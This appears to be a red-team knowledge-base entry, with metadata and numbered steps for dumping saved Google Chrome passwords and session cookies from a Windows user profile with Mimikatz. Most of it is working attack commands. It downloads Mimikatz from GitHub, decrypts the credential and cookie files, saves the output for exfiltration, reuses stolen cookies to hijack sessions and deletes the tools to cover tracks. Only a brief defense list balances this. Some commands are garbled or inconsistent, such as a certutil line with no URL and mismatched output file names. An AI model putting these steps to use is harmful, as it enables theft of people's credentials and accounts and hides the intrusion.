---
id: 724e0bb7-42fe-4f44-a406-e7a47a67bf7f
name: Extract-Chrome-Cookies-and-Passwords-From-Current-User-Profile
type: procedure
verified: true
submitted: false
created_at: '2020-07-21T00:02:06.223764+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
tactics:
  - '[[Credential Access]]'
techniques:
  - '[[Credentials from Web Browsers]]'
sub_techniques: []
tags:
  - chrome
  - dump
  - extract
  - credential-access
commands:
  - '[[commands/mimikatz-extract-chrome-passwords]]'
  - '[[commands/mimikatz-extract-chrome-cookies]]'
platforms:
  - Windows
tools:
  - '[[tools/Mimikatz]]'
validated: true
---

# Extract-Chrome-Cookies-and-Passwords-From-Current-User-Profile

## Summary

This procedure allows attackers with code execution in the context of the target user to extract saved passwords and cookies from Google Chrome's storage using Mimikatz. It targets the DPAPI-protected files in the user's profile, decrypting them to reveal plaintext credentials and session data for further exploitation, such as session hijacking or authentication bypass.

## Description

Google Chrome stores user credentials (passwords) in an SQLite database at 'Login Data' and cookies in a separate SQLite file at 'Cookies', both encrypted using Windows DPAPI tied to the user's login context. This procedure requires execution as the target user to access these files without elevation. Mimikatz's dpapi::chrome module handles the decryption by first extracting the master AES key from the Local State file and then decrypting the individual entries. This technique is commonly used in post-exploitation to harvest browser data for lateral movement or persistence. It only works if Chrome is not running (to avoid file locks) and the user has saved credentials/cookies.

## Requirements

1. Code execution in the context of the target user (no admin privileges needed).
2. Access to the target's file system (local or remote via SMB/WMI).
3. Mimikatz binary downloaded to the target (approximately 1MB, x86/x64 matching architecture).
4. Chrome installed with saved passwords or cookies (default paths apply).
5. Windows OS (tested on Windows 10/11; older versions may vary).

## Defense

- Enable Chrome's enhanced safe browsing and password manager protections.
- Use full-disk encryption (BitLocker) and restrict DPAPI access via group policy.
- Monitor for Mimikatz execution via process creation (e.g., Sysmon Event ID 1 for mimikatz.exe) and file access to Chrome directories.
- Implement application whitelisting to block unsigned binaries like Mimikatz.
- Regularly clear browser data and use password managers with master passwords.

## Objectives

1. Locate and access Chrome's credential and cookie storage files.
2. Decrypt and extract plaintext passwords and cookies using DPAPI.
3. Collect usable credentials for session hijacking or authentication.
4. Verify extraction success without alerting the user.

## Instructions

### Step 1: Identify Chrome Storage Locations

**Context**: Determine the exact paths to the 'Login Data' (passwords) and 'Cookies' files in the current user's profile. These are typically under AppData, but confirm to handle custom profiles.

Use Windows built-in commands to navigate and list files.

```cmd
cd /d %USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default

dir "Login Data"
dir Cookies
```

> This step verifies file existence. If Chrome is running, close it to unlock files. Expected output: File sizes and timestamps confirming presence (e.g., 'Login Data' ~10-50KB, 'Cookies' ~1-10MB).

### Step 2: Download Mimikatz to Target

**Context**: Obtain the Mimikatz executable for decryption. Download from a trusted source (in a real engagement, use C2 for transfer to avoid AV detection).

Transfer via PowerShell or certutil (assuming initial access).

```cmd
powershell -c "IWR -Uri 'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20201009/mimikatz_trunk.zip' -OutFile mimikatz.zip"

certutil -urlcache -split -f mimikatz.zip

powershell -c "Expand-Archive mimikatz.zip -DestinationPath ."
```

> Extracts mimikatz.exe. Expected output: Successful download and unzip without errors. Place in a temp directory like %TEMP%.

### Step 3: Extract Chrome Passwords

**Context**: Decrypt the 'Login Data' file to retrieve saved website passwords. This uses Mimikatz to unprotect DPAPI blobs and AES-encrypted entries.

**Command** ([[commands/mimikatz-extract-chrome-passwords]]):
```cmd
mimikatz.exe "dpapi::chrome /in:%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data /unprotect" "exit"
```

> Run from an elevated or user context. Mimikatz first finds the AES key in 'Local State', then decrypts passwords. Expected output: List of URLs, usernames, and plaintext passwords (e.g., 'URL: https://example.com, Username: user, Password: pass123'). Save output to a file with > output.txt for exfiltration.

### Step 4: Extract Chrome Cookies

**Context**: Decrypt the 'Cookies' SQLite file to retrieve session cookies, which can be used for hijacking active sessions without passwords.

**Command** ([[commands/mimikatz-extract-chrome-cookies]]):
```cmd
mimikatz.exe "dpapi::chrome /in:%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Cookies /unprotect" "exit"
```

> Similar to passwords, but targets cookies. Expected output: List of hostnames, cookie names, values, and expiration dates (e.g., 'Host: .example.com, Name: sessionid, Value: abc123def'). Pipe to file for analysis; import into a browser for reuse.

### Step 5: Verify and Exfiltrate Data

**Context**: Confirm extracted data is valid and prepare for removal from target.

Review output files and test a credential (e.g., via browser or curl). Delete Mimikatz and outputs to cover tracks.

```cmd
type passwords.txt
type cookies.txt

del mimikatz.exe
rmdir /s mimikatz_trunk
```

> Expected output: Readable credentials/cookies. Success if at least one valid entry is obtained; test by logging into a site with extracted data.
